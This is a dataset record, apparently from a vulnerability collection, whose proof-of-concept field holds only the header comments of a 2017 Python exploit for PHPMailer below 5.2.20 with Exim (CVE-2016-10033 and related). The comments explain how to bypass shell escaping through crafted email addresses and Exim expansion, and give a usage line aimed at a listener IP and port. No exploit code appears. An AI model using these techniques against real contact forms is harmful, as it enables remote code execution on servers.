{
    "text": "vul_name : PHPMailer < 5.2.20 with Exim MTA Remote Code Execution ， vul_cve : CVE-2016-10045 , CVE-2016-10033 , CVE-2016-10074 , CVE-2016-10034 ， vul_poc :  #  ! /usr/bin/python ，  # Exploit Title :  [ RCE for PHPMailer < 5.2.20 with Exim MTA ]  ，  # Date :  [ 16/06/2017 ]  ，  # Exploit Author :  [  @ phackt_ul ]  ，  # Software Link :  [  ，  # Version :  [ < 5.2.20 ]  ，  # Tested on :  [ Debian x86/x64 ]  ，  # CVE :  [ CVE-2016-10033 , CVE-2016-10074 , CVE-2016-10034 , CVE-2016-10045 ]  ，  #  @ phackt_ul - ，  # All credits go to Dawid Golunski (  @ dawid_golunski ) - ，  # and its research on PHP libraries vulns ，  # PHPMailer < 5.2.18 Remote Code Execution ( CVE-2016-10033 )  ，  # PHPMailer < 5.2.20 Remote Code Execution ( CVE-2016-10045 ) - escapeshellarg (  ) bypass ，  # SwiftMailer <= 5.4.5-DEV Remote Code Execution ( CVE-2016-10074 )  ，  # Zend Framework / zend-mail < 2.4.11 - Remote Code Execution ( CVE-2016-10034 )  ，  # ExploitBox project :  ，  # Full advisory URL :  ，  # Enhanced for Exim MTA ，  # N.B :  ，  # The original author's method in the PHPMailer POC ( for sendmail MTA ) uses the RFC 3696 ，  # double quotes technique associated with the -oQ -X options to log mailer traffic and to create ，  # the backdoor. This technique is not facing some payload size issues because the payload ，  # was in the email body. ，  # For Exim :  ，  # The original author's Wordpress 4.6 POC for Exim combines the comment syntax ( RFC 822 )  ，  # and the Exim expansion mode techniques. The use of substr on spool_directory and tod_log ，  # expansion variables in order to bypass the PHP mail (  ) escaping may leads to large ，  # email addresses payloads. However the comment syntax validateAddress (  ) technique does not ，  # face any size limitation but its use can not be applied for PHPMailer < 5.2.20. ，  # Goal :  ，  # The use of double quotes validateAdresse (  ) technique ( and it's patch bypass for PHPMailer < 5.5.20 )  ，  # combined with the Exim expansion mode technique may leads to large payloads quickly facing addresses ，  # size limit here ( 260 chars ) and so not matching the pcre8 regexp in the validateAddress (  ) function. ，  # We are now base64 encoding the command in order to bypass escapeshellcmd (  ) and allowing larger payloads. ，  # Usage :  ，  # ./rce_phpmailer_exim4.py -url -cf contact_form.php -ip 192.168.1.109 -p 1337 ，  # Requirements :  ，  # - Vulnerable PHP libraries ，  # - Exim MTA Agent",
    "time": "2017.06.22"
}